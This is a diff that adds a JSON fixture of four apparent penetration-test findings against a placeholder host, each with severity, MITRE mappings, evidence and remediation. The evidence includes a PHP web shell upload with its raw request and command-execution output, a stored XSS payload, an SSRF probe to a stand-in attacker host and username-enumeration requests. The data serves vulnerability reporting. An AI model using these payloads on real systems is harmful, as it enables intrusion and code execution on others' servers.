@@ -1,0 +1,152 @@
+[
+  {
+    "id": "vuln_c0ffee",
+    "campaign_id": "camp_20260930_ab12cd34",
+    "project_id": "proj_7f3e21",
+    "target_id": "tgt_0a1b2c",
+    "node_id": "svc_tgt0a1b2c_443_tcp",
+    "title": "Unauthenticated remote code execution in file upload handler",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": "CVE-2026-12345",
+    "category": "remote_code_execution",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.8.25",
+    "status": "exploited",
+    "description": "The file upload handler stores uploaded files under the web root without validating the extension, allowing an unauthenticated attacker to upload and execute a PHP web shell.",
+    "evidence": {
+      "commands": [
+        "curl -s -F 'file=@shell.php' https://app.example.test/upload",
+        "curl -s https://app.example.test/uploads/shell.php?cmd=id"
+      ],
+      "payloads": [],
+      "raw_request": "POST /upload HTTP/1.1\nHost: app.example.test\nContent-Type: multipart/form-data; boundary=x\n\n--x\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>\n--x--",
+      "raw_response": "HTTP/1.1 200 OK\n\n{\"stored\":\"/uploads/shell.php\"}",
+      "extracted_data": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "screenshots": [],
+      "logs": [
+        "[11:02:10] uploaded shell.php (200 OK)",
+        "[11:02:11] executed id via ?cmd=id, got www-data",
+        "[11:02:11] RCE confirmed"
+      ],
+      "explanation": "A PHP web shell was uploaded and executed, returning the output of the id command as the www-data user."
+    },
+    "remediation": "Validate and allow-list upload extensions, store uploads outside the web root, and serve them through a handler that never executes them.",
+    "plugin_or_component": "upload-handler",
+    "endpoint": "https://app.example.test/upload",
+    "discovered_by_agent": "php",
+    "discovered_at": "2026-09-30T11:02:11Z"
+  },
+  {
+    "id": "vuln_d00d1e",
+    "campaign_id": "camp_20260930_ab12cd34",
+    "project_id": "proj_7f3e21",
+    "target_id": "tgt_0a1b2c",
+    "node_id": "svc_tgt0a1b2c_443_tcp",
+    "title": "Stored cross-site scripting in profile display name",
+    "severity": "high",
+    "cvss_score": 8.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+    "cve": null,
+    "category": "xss_stored",
+    "mitre_attack_id": "T1059.007",
+    "mitre_attack_name": "Command and Scripting Interpreter: JavaScript",
+    "iso27001_control": "A.8.28",
+    "status": "resolved",
+    "description": "The profile display name is rendered without output encoding, allowing a stored XSS payload that executes for anyone who views the profile.",
+    "evidence": {
+      "commands": [
+        "curl -s -X POST https://app.example.test/profile -d 'display_name=<script>alert(1)</script>'"
+      ],
+      "payloads": ["<script>alert(1)</script>"],
+      "raw_request": "",
+      "raw_response": "",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "[11:20:03] stored payload in display_name",
+        "[11:20:09] payload reflected unencoded on /profile/view"
+      ],
+      "explanation": "The payload stored in the display name was reflected without encoding and executed in the victim's browser. A later re-test confirmed the vendor fix encodes the field."
+    },
+    "remediation": "HTML-encode user-controlled output and apply a context-aware templating auto-escape.",
+    "plugin_or_component": "profile-renderer",
+    "endpoint": "https://app.example.test/profile/view",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-30T11:20:09Z"
+  },
+  {
+    "id": "vuln_5e7f00",
+    "campaign_id": "camp_20260930_ab12cd34",
+    "project_id": "proj_7f3e21",
+    "target_id": "tgt_0a1b2c",
+    "node_id": "svc_tgt0a1b2c_443_tcp",
+    "title": "Server-side request forgery in URL preview feature",
+    "severity": "medium",
+    "cvss_score": 6.5,
+    "cvss_vector": null,
+    "cve": null,
+    "category": "ssrf",
+    "mitre_attack_id": null,
+    "mitre_attack_name": null,
+    "iso27001_control": null,
+    "status": "unconfirmed",
+    "description": "The URL preview feature fetches arbitrary user-supplied URLs server-side, which may allow access to internal services. Reaching cloud metadata was attempted but not proven.",
+    "evidence": {
+      "commands": [],
+      "payloads": [],
+      "raw_request": "",
+      "raw_response": "",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [],
+      "explanation": "The preview endpoint fetched an attacker-controlled host, but access to an internal target was not demonstrated."
+    },
+    "remediation": "Resolve and allow-list outbound hosts, block RFC 1918 and link-local ranges, and disable redirects.",
+    "plugin_or_component": null,
+    "endpoint": "https://app.example.test/preview?url=https://attacker.example.test",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-09-30T11:35:40Z"
+  },
+  {
+    "id": "vuln_aa11bb",
+    "campaign_id": "camp_20260930_ab12cd34",
+    "project_id": "proj_7f3e21",
+    "target_id": "tgt_0a1b2c",
+    "node_id": "svc_tgt0a1b2c_443_tcp",
+    "title": "Verbose authentication error enables username enumeration",
+    "severity": "low",
+    "cvss_score": 3.7,
+    "cvss_vector": null,
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1589.002",
+    "mitre_attack_name": "Gather Victim Identity Information: Email Addresses",
+    "iso27001_control": "A.8.15",
+    "status": "confirmed",
+    "description": "The login endpoint returns a different message for unknown users versus wrong passwords, allowing username enumeration.",
+    "evidence": {
+      "commands": [
+        "curl -s -X POST /api/login -d 'user=known@example.test&pass=x'",
+        "curl -s -X POST /api/login -d 'user=unknown@example.test&pass=x'"
+      ],
+      "payloads": [],
+      "raw_request": "",
+      "raw_response": "",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "[11:50:02] known user -> 'invalid password'",
+        "[11:50:03] unknown user -> 'no such account'"
+      ],
+      "explanation": "Two distinct error messages let an attacker tell valid accounts apart. The report records only the bare path for this finding."
+    },
+    "remediation": "Return a single generic authentication failure message regardless of which credential was wrong.",
+    "plugin_or_component": "auth-controller",
+    "endpoint": "/api/login",
+    "discovered_by_agent": "php",
+    "discovered_at": "2026-09-30T11:50:03Z"
+  }
+]
